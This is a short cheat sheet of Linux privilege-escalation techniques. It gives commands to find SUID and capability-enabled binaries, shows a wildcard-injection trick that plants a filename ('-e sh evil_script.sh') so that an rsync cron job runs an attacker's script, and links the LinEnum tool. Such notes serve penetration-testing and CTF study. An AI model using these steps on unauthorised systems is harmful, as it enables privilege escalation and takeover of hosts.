



* [Find SUID-bit set files](#suid binary)
* [Find executable with capabilites](#capabilities executable)
* [Exploiting wildcards crons](#wild wildcards)
* [LinEnum.sh](#linenum.sh)





## suid binary

`$ find / -perm -u=s 2>/dev/null`


## Capabilities executable

` find / -type f -print0 2>/dev/null  |  xargs -0 getcap   2>/dev/null`


## Wild Wildcards

When a cronjob is running with a wildcard as * as arguments, it can be exploited:

example:  

	- cron :  

	> $ rsync /backup/* rsync://backup:/src/backup-server/

We can create a file that gonna act as an argument, like:  

	> $ touch -- "/backup/-e sh evil_script.sh"

The final command will be executed as:  

	> $ rsync -e sh evil_script.sh rync://backup:/src/backup-server/   


rync will execute the script as the user who runs the cron :D


## LinEnum.sh

Bash script tool who gives you a entire surface map of the system :D  

- [LinkToLinenum](https://github.com/jcatala/h4ckme/tree/master/enumeration/LinEnum.sh)


